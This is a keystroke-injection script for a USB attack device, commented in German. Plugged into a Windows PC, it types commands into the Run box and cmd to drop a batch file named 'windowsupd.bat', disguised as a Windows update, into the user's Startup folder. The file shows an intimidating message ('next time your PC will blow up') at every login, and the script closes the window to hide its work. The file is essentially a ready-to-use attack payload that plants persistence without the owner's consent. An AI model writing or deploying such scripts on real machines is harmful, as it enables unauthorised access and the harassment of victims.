layout("de"); //Deutsche Tastatur gewählt
typingSpeed(100,150)

press("GUI R") //Ich öffne das Win+R (Run) Menü
delay(500)
type("cmd") //CMD öffnen
delay(500)
press("ENTER")
delay(500)
type("cd C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup") //Wir begeben uns zum Ordner, wo alles zu Beginn gestartet wird.
delay(500)
press("ENTER")
delay(500)
type("echo @echo off > windowsupd.bat") //Erstellen die bat Datei mit einem versteckten Namen
delay(500)
press("ENTER")
delay(500)
type("echo echo Beim nächsten mal geht dein PC in die Luft! >> windowsupd.bat")
delay(500)
press("ENTER")
delay(500)
type("echo pause >> windowsupd.bat")
delay(500)
press("ENTER")
delay(500)
press("ALT F4")